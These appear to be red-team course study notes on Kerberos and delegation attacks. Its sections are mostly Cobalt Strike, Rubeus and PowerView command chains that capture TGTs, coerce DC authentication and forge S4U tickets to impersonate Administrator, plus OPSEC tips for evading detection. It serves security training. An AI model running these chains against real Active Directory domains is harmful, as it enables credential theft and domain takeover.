The following section details theory behind Kerberos, delegation attacks, and operating from Windows, Cobalt Strike, and OPSEC. If you don't care about any of that, see [[Kerberos Delegation]] instead.

Kerberos has replaced NTLM as the default domain authentication protocol since Windows Server 2000. Lets introduce some terms first.

See [[15 Forest & Domain Trusts]] to understand Kerberos across different realms.

OPSEC NOTE:
	`run klist` is great but bad opsec from my understanding

IMPERSONATION NOTES
	Administrator is always a good choice... especially if you want CIFS
#### Terms
Key Distribution Center
	A database of all principals and their associated secrets (i.e. password hashes).
	An Authentication Server (AS).
	A Ticket Granting Server (TGS).
	DCs act as the KDC

Ticket Granting Ticket
	A TGT is provided to a principal after their identity has been verified by the AS component of the KDC.
	Used in lieu of password when accessing a service.

Service
	A service is a resource that can be accessed by a principal.
	Identified by unique Service Principal Name (SPN)

Service Ticket
	To access a service, a principal must first request a service ticket from the TGS by sending their TGT as evidence of their identity.
	Service tickets are also called TGS ( Confusing I know... )

Privileged Attribute Certificate
	The PAC is a structure that can be attached to a ticket which contains additional information about a principal.
	When presenting a service ticket to a service, the service is able to inspect the PAC to determine the user's privilege without having to query it from AD.
#### Authentication Overview
![[Pasted image 20251230142033.png]]
1. AS Exchange (Authentication Service)
	_Goal: Obtain a Ticket Granting Ticket (TGT)._
	- **AS-REQ:** Client sends a request to the KDC (Domain Controller) containing the username and a **Pre-Authentication** blob (typically a timestamp encrypted with the user's password hash).
	- **AS-REP:** The KDC verifies the timestamp. If valid, it returns:
	    - **TGT:** Encrypted with the `krbtgt` hash (invisible to the client).
	    - **Logon Session Key:** Encrypted with the user's password hash.
		![[Pasted image 20251230143839.png]]
	- **💡 Red Team Note:** **AS-REP Roasting** targets users with "Do not require Kerberos preauthentication" enabled to crack their hashes offline.
2. TGS Exchange (Ticket Granting Service)
	_Goal: Obtain a Service Ticket (ST)._
	- **TGS-REQ:** Client sends the **TGT** + an **Authenticator** (timestamp encrypted with the Logon Session Key) + the **SPN** (Service Principal Name) of the resource (e.g., `cifs/server01`).
	- **TGS-REP:** The KDC decrypts the TGT, verifies the session key, and returns:
	    - **Service Ticket:** Encrypted with the **Service Account's hash**.
	    - **Service Session Key:** Encrypted with the Logon Session Key.
	    ![[Pasted image 20251230143946.png]]
	- **💡 Red Team Note:** **Kerberoasting** involves requesting these Service Tickets and attempting to crack the service account’s password hash offline.
3. AP Exchange (Application Request)
	_Goal: Access the target resource._
	- **AP-REQ:** Client sends the **Service Ticket** + a new **Authenticator** (encrypted with the Service Session Key) to the target server.
	- **AP-REP:** (Optional/Mutual Auth) The server decrypts the ticket using its own hash, extracts the session key, and sends back a confirmation to the client.
	- **Authorization:** The server inspects the **PAC (Privilege Attribute Certificate)** inside the ticket to determine the user's group memberships and permissions.

#### Lateral Movement Services Cheat Sheet
All of the [lateral movement](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=674b793699b3a08430017d88) techniques that are covered in this section rely on Windows protocols that are designed to facilitate remote administration. This helps blend lateral movement with legit admin.

This table provides guidance on what service tickets are required to access services useful for lateral movement and data access.

| **Name** | **Description**                                                      | **Ticket(s)**                          |
| -------- | -------------------------------------------------------------------- | -------------------------------------- |
| SMB      | Access the remote filesystem.  View, list, upload, & delete files.   | CIFS                                   |
| PsExec   | Run a binary via the Service Control Manager.                        | CIFS                                   |
| WinRM    | Windows Remote Management.                                           | HTTP                                   |
| WMI      | Execute applications on the remote target, e.g. process call create. | RPCSS  <br>HOST  <br>RestrictedKrbHost |
| RDP      | Remote Desktop Protocol.                                             | TERMSRV  <br>HOST                      |
| MSSQL    | MS SQL Databases.                                                    | MSSQLSvc                               |

## Unconstrained Delegation
Kerberos "delegation" is a feature that allows one principal to request access to resources on behalf of another principal.
	ie: Users of a web app perform operations that require a backend service such as MSSQL, the web app acts in their place.
	There are multiple types of delegation in modern Windows:
		Unconstrained Delegation
		Constrained Delegation
		Role-Based Constrained Delegation

Unconstrained is the first type of delegation and the most dangerous
	Set with `TRUSTED_FOR_DELEGATION` flag
	NOTE: DCs have this as default which is expected

What is happening here?
	Client requests service ticket for an SPN under context of computer account.
	DC sets flag in TGS-REP called `ok-as-delegate`
	Tells client that the server specified is trusted for delegation.
	AP-REQ goes to service, including service ticket and user's TGT.
	Computer running service caches user TGT in memory, for future use.

Why is this bad?
	Compromise of computer with unconstrained delegation means we can extract TGTs from memory.
	We can use Rubeus to `monitor` computers with unconstrained delegation.
		Periodically captures and displays TGTs as user's authenticate to a service.

Is this guaranteed to work?
	No. We have to wait for a user to interact with the computer.
	See S4U2self Computer Takeover section to force computers to authenticate.

Abusing Unconstrained Delegation
```powershell
# Query to identify AD objects w/ unconstrained delegation
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

# Move laterally to vulnerable computer (See 10 Lateral Movement)
beacon> make_token [DOMAIN\user] [password]  # examples
beacon> jump psexec64 lon-ws-1 smb  # BAD OPSEC

# Monitor for TGTs as user's authenticate to services
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
	# Wait for a bit
	# Capture!

# Terminate Rubeus monitor
beacon> jobs            # Note JID of Rubeus (.NET Assembly)
beacon> jobkill [JID]

# Inject Captured TGT into logon session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[domain] /username:[victim_user] /password:FakePass /ticket:[TICKET] # Spawn sacrifical logon session
beacon> steal_token [PID] # Impersonate spawned process
beacon> run klist         # Verify ticket is present... BAD OPSEC

# Abuse as necessary 
beacoon> ls \\[dc hostname]\c$ # example

# Drop impersonation and cleanup
beacon> rev2self
beacon> kill [PID]
```

## Constrained Delegation
Constrained delegation is set on a front-end service and defines the back-end service(s) to which it can delegate to.

The Service for User (S4U) Kerberos extension was introduced in Server 2003 as a replacement for the rather problematic unconstrained delegation.  It provides two new protocols:

Service for User to Proxy (S4U2proxy) -- **Constrained Delegation**
	Kerberos ONLY
	Allows a service to obtain a service ticket on behalf of a user to a different service.
	Attempts to limit the services another service can delegate.
	Does NOT rely on service needing user TGT to work.
	Configured via `msDS-AllowedToDelegateTo` attribute.

Service for User to Self (S4U2self) -- **Protocol Transition**
	Kerberos + OTHER
	Intent is to be used when a user authenticates in a way other than Kerberos.
	Allows a service to obtain a service ticket on behalf of a user to itself. 
	ie: Service performs S4U2self to get service ticket for user, then S4U2proxy to get service ticket for another service.
	`TRUSTED_TO_AUTH_FOR_DELEGATION` flag must be set on UAC - 16777216 is the flag

Attack procedure will vary depending on if protocol transition is enabled or not. If enabled, it is a bit easier to abuse.
	Rubeus is able to perform both the S4U2self and S4U2proxy steps in one `s4u` command.

Abusing S4U
```powershell
# Query to identify hosts with CONSTRAINED DELEGATION & Services vulnerable
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo # Annotate hosts and service
	# make note of FULL spn, including PORT
	# IF WE NEED TO CHANGE THE SERVICE, proceed to Service Name Substitution

# Check if TRUSTED_TO_AUTH_FOR_DELEGATION flag is set
beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=[hostname]$)) --attributes userAccountControl 
[Convert]::ToBoolean([UAC VALUE] -band 16777216) #True = PROTOCOL TRANSITION set
	# if this doesnt work, i have another query in Discovery LDAP section you can try

# Move laterally to vulnerable computer (See 10 Lateral Movement)
beacon> make_token [DOMAIN\user] [password]  # examples
beacon> jump psexec64 lon-ws-1 smb  # BAD OPSEC
```
Attacking S4U with Protocol Transition Enabled
	When protocol transition is enabled, the adversary can obtain a TGT for the computer account and use it to perform an S4U2self request.  They have complete freedom in what username they put in the TGS-REQ, so can impersonate any user in the domain.
```powershell
# Triage and dump computer TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[LUID] /service:krbtgt /nowrap

# Using S4U to impersonate any user in the domain
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
    # /user = the principal (e.g. computer) configured for the delegation.
    # /msdsspn = the service that the principal is allowed to delegate to.
    # /ticket = the TGT for the principal.
    # /impersonateuser = the user we want to impersonate.

# OPTIONAL - View ticket of computer account
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=
	# some things to note:
	# ServiceName=Computer, UserName = impersonated user, Flags contain forwardable

# Inject captured service ticket (the 2nd one) into logon session 
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[DOMAIN] /username:[victim] /password:FakePass /ticket:[service_ticket]
beacon> steal_token [PID]  # Impersonate spawned process
beacon> run klist          # Verify ticket is present

# Abuse as necessary.
beacoon> ls \\[dc hostname]\c$ # example

# Drop impersonation and cleanup
beacon> rev2self
beacon> kill [PID]
```

Attacking S4U with Protocol Transition Disabled
	The computer's TGT cannot be used to obtain a forwardable service ticket via S4U2self when protocol transition is not enabled.  The S4U2self will still return a ticket but the forwardable flag will not be set, so S4U2proxy fails.
	Instead, the adversary must obtain a service ticket that a user has requested to gain access to the front-end service
```powershell
## NOTE : Requires a service ticket that a user has requested to gain access to a service. 

# Using S4U to impersonate a user we have a service ticket for ALREADY
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap
    # /user = the principal (e.g. computer) configured for the delegation.
    # /msdsspn = the service that the principal is allowed to delegate to.
    # /ticket = the TGT for the principal.
    # /tgs = a captured front-end service ticket for a user.

# Inject captured service ticket into logon session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[DOMAIN] /username:[victim] /password:FakePass /ticket:[ticket] # Spawn sacrifical logon session
beacon> steal_token [PID]  # Impersonate spawned process
beacon> run klist          # Verify ticket is present

# Abuse as necessary.
beacoon> ls \\[dc hostname]\c$ # example

# Drop impersonation and cleanup
beacon> rev2self
beacon> kill [PID]
```

## Service Name Substitution (for Constrained Delegation)
Service Name Substitution is a technique that allows an adversary to "swap" a service ticket for one service, to another service.

Why is this possible?
	Both **AS-REP** and **TGS-REP** utilize the same `KDC-REP` structure.
	**Plaintext `sname`:** The **SPN** (Service Principal Name) field (`sname[2]`) is **plaintext** and not included in the ticket's checksum.
	An attacker can manually overwrite the SPN (e.g., changing `HTTP/web01` to `CIFS/web01`) after the ticket is issued.

Why is this Useful?
	In cases of constrained delegation, the services being delegated might not be useful.
	ie: `time/pc1` -- TIME is not useful like CIFS
	But we can change it!

How?
	Rubeus via the `/altservice` parameter. Can take a list as well.
	ie: `/altservice:cifs,host,http`

NOTE: This only works if the substituted SPN is running as the same account as the original service; i.e. you cannot swap HTTP/PC1 for something like CIFS/PC2.

Service Name Substitution (Protocol Substitution enabled)
```powershell
## First identify computers vulnerable to controlled delegation, if protocol transition is enabled, and their services (see Controlled Delegation section above)

# Move laterally to vulnerable computer (See 10 Lateral Movement)
beacon> make_token [DOMAIN\user] [password]  # examples
beacon> jump psexec64 lon-ws-1 smb  # BAD OPSEC

# Triage and dump computer TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[LUID] /service:krbtgt /nowrap

# S4U to impersonate any user AND change service
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:[ticket] /impersonateuser:Administrator /nowrap
	# /user = the principal (e.g. computer) configured for the delegation.
	# /msdsspn is the service that the principal is allowed to delegate to.
	# /altservice is the service to substitute into the final ticket.
	# /ticket is the TGT for the principal.
	# /impersonateuser is the user we want to impersonate.

# Inject service ticket into logon session
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[DOMAIN] /username:Administrator /password:FakePass /ticket:[ticket] # spawn logon session
beacon> steal_token [PID]  # Impersonate spawned process
beacon> run klist          # BAD OPSEC - Verify ticket is present

# Abuse as necessary.
beacoon> ls \\[dc hostname]\c$ # example

# Drop impersonation and cleanup
beacon> rev2self
beacon> kill [PID]
```


## S4U2self Computer Takeover (for Unconstrained Delegation)
Unconstrained Delegation monitoring is not guaranteed to work, because it requires a user to authenticate. In this section, we will go after a computer directly.

There are multiple 'remote authentication triggers' that can be used to force a computer to authenticate to another computer.
	2 popular techniques
	SpoolSample : uses Print System Remote Protocol (MS-RPRN)
	PetitPotam : uses Encrypting File System Remote Protocol (MS-EFSRPC)

S4U2Self Computer Takeover Attack
```powershell
# Identify computers with unconstrained deletagtion
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

# Move laterally to vulnerable computer (See 10 Lateral Movement)
beacon> make_token [DOMAIN\user] [password]  # examples
beacon> jump psexec64 lon-ws-1 smb  # BAD OPSEC

# Monitor for tickets (from high integrity beacon on vulnerable computer)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap

# Force DC to authenticate to monitored system (from medium integrity beacon)
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe [DC hostname] [monitored host]   # run as standard domain user w/ medium integrity
	# Make note of captured TGT of DC computer account.

# Stop monitoring
beacon> jobs
beacon> jobkill [JID]

# Use S4U2self protocol to obtain usable service ticket for different impersonated user (We can't use computer accounts to get local admin access remotely)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[DC TGT] /nowrap
    # /impersonateuser = the user we want to impersonate.
    # /self tells Rubeus not to submit an S4U2proxy request.
    # /altservice = the SPN we want substituted into the service ticket.
    # /ticket = the computer's TGT.

# Inject captured service ticket into sacrificial logon session 
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[DOMAIN] /username:Administrator /password:FakePass /ticket:[service_ticket]
beacon> steal_token [PID]  # Impersonate spawned process
beacon> run klist          # Verify ticket is present

# Abuse as necessary.
beacoon> ls \\[dc hostname]\c$ # example

# Drop impersonation and cleanup
beacon> rev2self
beacon> kill [PID]
```
Explanation:
	S4U2self is performed but NOT S4U2self request because no constrained delegation here.
	Swap out service name via `/altservice`


## Resource-Based Constrained Delegation
Windows 2012 introduced another form of delegation, called resource-based constrained delegation (often shorted to RBCD)
	Puts delegation control into the hands of the service administrators (e.g. it no longer requires SeEnableDelegationPrivilege to configure)

In RBCD, back-end services control which front-end services can delegate to it.
	Controlled in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the service account running the back-end service
	Requires `write` access to modify

An admin with these rights can added the desired RBCD entries via RSAT PowerShell cmdlets
```powershell
$front = Get-ADComputer -Identity 'lon-ws-1'
$back = Get-ADComputer -Identity 'lon-fs-1'

Set-ADComputer -Identity $back -PrincipalsAllowedToDelegateToAccount $front
```

Requirements to abuse RBCD to gain access to any computer:
	Write access to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of a computer object. 
	Control of another principal that has an SPN set.
		• Computer accounts if we have elevated priv to SYSTEM
		• Service accounts if we obtained creds via kerberoasting
		• Adding own computer to domain (last ditch effort)
			Tools such as [StandIn](https://github.com/FuzzySecurity/StandIn) can create these fake computer objects via LDAP.

NOTE: It's much easier to enumerate and abuse RBCD through a SOCKS proxy. 

Abusing RBCD - can replace IPs with hostnames ;)
#### Method 1 (SOCKS)
```powershell
REQUIREMENTS SECTION
# Enumerating ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
PS C:\Users\Attacker> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
PS C:\Users\Attacker> $Cred = Get-Credential [DOMAIN\user]
PS C:\Users\Attacker> Get-DomainComputer -Server 10.10.120.1 -Credential $Cred | Get-DomainObjectAcl -Server 10.10.120.1 -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier
	# Make note of SIDs identified

# Resolve SID to
PS C:\Users\Attacker> Get-ADGroup -Filter 'objectsid -eq "[SID]"' -Server 10.10.120.1 -Credential $Cred
	# If we can compromise this, we are good to modify perms in The Attack section

# Select an account with an SPN (Computer account with SYSTEM priv / svc_account)

__________________________________________________________________________________

THE ATTACK
# Idenfity PrincipalsAllowedToDelegateToAccount prperties in environment
PS C:\Users\Attacker> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

# Example property collection
Name        PrincipalsAllowedToDelegateToAccount
----        ------------------------------------
LON-DC-1    {}
LON-WS-1    {}
LON-FS-1    {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com}
LON-WKSTN-1 {}
LON-WKSTN-2 {}

# NOTE: collection can only have values of same type.
# since LON-FS-1 contains LON-WS-1, we can only add COMPUTER accounts, not USERS
	# removing values is possible but BAD OPSEC
	# in this scenario, only add computers we have SYSTEM on

# Add computer accounts we have SYSTEM on to computer that can be delegated to
PS C:\Users\Attacker> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred

# Verify entries were added
PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name     PrincipalsAllowedToDelegateToAccount
----     ------------------------------------
LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com, CN=LON-WKSTN-1,OU=Workstations,DC=contoso,DC=com}

# Triage and dump computer TGT of principal we just added
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[LUID] /service:krbtgt /nowrap

# Perform S4U steps to impersonate anyone in domain
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:doIFr[...snip...]kNPTQ== /nowrap

# Inject captured service ticket (the 2nd one) into logon session 
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGh[...snip...]nMtMQ==
beacon> token-store steal [PID]  
beacon> token-store use 0 # Impersonate spawned process

# Abuse
beacon> ls \\lon-fs-1\c$

# Drop impersonation and cleanup
beacon> rev2self
beacon> kill [PID]

# Cleanup - remove our entry by running Set-ADComputer again with original account
PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
```
#### Method 2 - PowerView
This is pulled and a slightly modified version of An0nud4y's checklist. This is if we have local admin access to a domain joined computer. If we don't, see case 2 of [[An0nud4y CRTO Cheatsheet]]
```powershell
## Enumerate domain computers that we have access to modify
beacon> powerpick Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-1330904164-3792538338-293942156-[\d]{4,10}" }     # REPLACE SID with Domain SID
	# Annotate vulnerable host and write property

# Identify computer SID
beacon> powerpick Get-DomainComputer -Identity <hostname> -Properties objectSid
	# Make note of computer SID

# Set delegation attribute
beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1330904164-3792538338-293942156-2101)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "enc-fs-1" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
	# Modify computer SID & identity (hostname)

# Verify attribute was set (should look like bits...)
beacon> powerpick Get-DomainComputer -Identity "enc-fs-1" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Get TGT of our domain joined computer
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
	# TGT
	[record TGT here]

# S4U to get TGS of target computer
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:ENC-JMP-1$ /impersonateuser:Administrator /msdsspn:cifs/enc-fs-1.contoso.enclave /ticket:[TGT] /nowrap
	# TGS
	[record TGS here]

# Inject TGS into sacrificial session, impersonating any user
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.ENCLAVE /username:Administrator /password:FakePass /ticket:[]
	# Annotate PID
beacon> token-store steal 6112
beacon> token-store use 0

# Jump to vulnerable machine
beacon> ls \\enc-fs-1.contoso.enclave\c$
beacon> jump scshell64 enc-fs-1.contoso.enclave smb
```

